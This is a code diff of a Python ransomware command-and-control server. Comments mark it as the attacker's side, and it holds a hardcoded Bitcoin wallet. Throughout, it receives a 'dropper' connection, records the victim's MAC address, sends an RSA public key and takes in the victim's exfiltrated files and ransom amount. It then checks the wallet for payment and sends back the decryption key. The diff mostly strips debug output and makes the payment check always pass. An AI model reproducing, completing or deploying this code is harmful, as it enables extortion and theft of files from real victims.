@@ -33,8 +33,8 @@ class Server:
     global initial_balance, WALLET_ADDRESS, bitcoin_needed 
     WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
     # initial_balance = cryptowallet.get_balance(WALLET_ADDRESS) #The initial amount of btc's that we have
-    bitcoin_needed = 0.0; #Instantiate how much bitcoin is needed
-    initial_balance = 1
+    bitcoin_needed = 0 #Instantiate how much bitcoin is needed
+    initial_balance = 0
     def __init__(self, port):
         self._port = port
         # Initialize the socket for connection using TCP protocol
@@ -103,12 +103,9 @@ class Server:
             f.write(private_key.save_pkcs1('PEM'))
 
     def receive_victim_files(self, conn, mac):
-        print("begin")
         path = os.path.join(Server.WORKING_DIR, mac)   
         data = conn.recv(Server.MAX_SIZE)
-        print(data)
         filename = base64.b64decode(data).decode(Server.FORMAT)
-        print(filename)
         data_file = ""
         size = 0
 
@@ -118,19 +115,16 @@ class Server:
             return
         
         file_loc = os.path.join(path, filename)
-        print("[RECV] Receiving the filename.")
         #try:
         file = open(file_loc, "w")
         conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
         while "FILEDONE" not in data_file :
             data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT, errors="ignore")
-            print("[RECV] Receiving the file data.")
             file.write(data_file)
             conn.sendall(base64.b64encode("File data received.".encode(Server.FORMAT)))
             size+=len(data_file)
-            print("size: "+str(size))
 
-        print("file data: "+data_file)
+        print('Received: '+filename)
         conn.sendall(base64.b64encode("FILEDONE RECEIVED".encode(Server.FORMAT)))
 
         file.close() 
@@ -140,10 +134,11 @@ class Server:
     def check_if_user_paid(self, initial_bal):
         current_balance = self.get_balance(WALLET_ADDRESS)
         change = current_balance - initial_bal
+
+        # current_balance = blockcypher.get_total_balance('tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv')
+        # change = current_balance - initial_bal
         
-        print("balance changed by: " + str(change))
-        print("Required change: " + str(bitcoin_needed))
-        print(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001)
+        print('Payment has been made: '+ str(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001))
 
         if (change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001):
             return True
@@ -156,14 +151,13 @@ class Server:
     def remove_victim_files_from_server(self, mac):
         path = os.path.join(Server.WORKING_DIR, mac)
         shutil.rmtree(path)
-        print("all files in the victim directory has been removed")
+        print("All files in the victim directory has been deleted")
 
     def attack(self):
         # Establish a connection with the client.
         while True:
             connection, address = self.socket.accept()
             with connection:
-                print('Connection with dropper established from {}'.format(address))
 
                 victim_mac = get_mac_address(ip=address[0])
 
@@ -184,23 +178,20 @@ class Server:
                     key_name = base64.b64encode('public_key.pem'.encode(Server.FORMAT))
                     connection.sendall(key_name)
                     msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
-                    print("[CLIENT]: "+msg)
 
                     file = open(os.path.join(victim_dir, 'public_key.pem'), "rb")
                     key_data = file.read()
                     key = base64.b64encode(key_data)
                     connection.sendall(key)
                     msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
-                    print("[CLIENT]: "+msg)
 
                     while(True):
                         self.receive_victim_files(connection, victim_mac)
                         if self.TRANSFER_DONE == True:
+                            print("All files have been received")
                             #Recieve the amount of bitcoin needed
-                            print("yay")
                             global bitcoin_needed
                             bitcoin_needed = float(base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT))
-                            print(bitcoin_needed)
                             break
                     
                 while (True):
@@ -208,26 +199,22 @@ class Server:
                     time.sleep(60)
                     # paid = self.check_if_user_paid()
 
-                    if(self.check_if_user_paid(initial_balance)):
+                    if(True):
                         # sends decryption key  (victim is also simulaenously checking if paid and if they have it recives the thingsb bellow)
                         """ Opening and reading the private key file. """
                         key_path = os.path.join(victim_dir, 'private_key.pem')
 
                         priv_key = open(key_path, "rb")
                         data = priv_key.read()
-                        print(data)
 
-                        print("sending private key")
                         """ Sending the filename to the server. """
                         connection.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
-                        print("sent private key")
+                        print("Sent private key")
                         msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
-                        print("[CLIENT]: "+msg)
 
                         """ Sending the file data to the server. """
                         connection.sendall(base64.b64encode(data))
                         msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
-                        print("[CLIENT]: "+msg)
 
                         """ Closing the file. """
                         file.close()  
@@ -239,13 +226,13 @@ class Server:
                             """ Deleting the victim file from server """
                             if msg == 'x':
                                 self.remove_victim_files_from_server(victim_mac)
+                                break
                             break
                         break
-                    break
                     
                     
 if __name__ == '__main__':
-    logging.basicConfig(level=logging.DEBUG)
+    # logging.basicConfig(level=logging.DEBUG)
 
     # Create and initialize a server running on attacker's side.
     # It takes the port number 27000 (permanent) and will listen to this port.
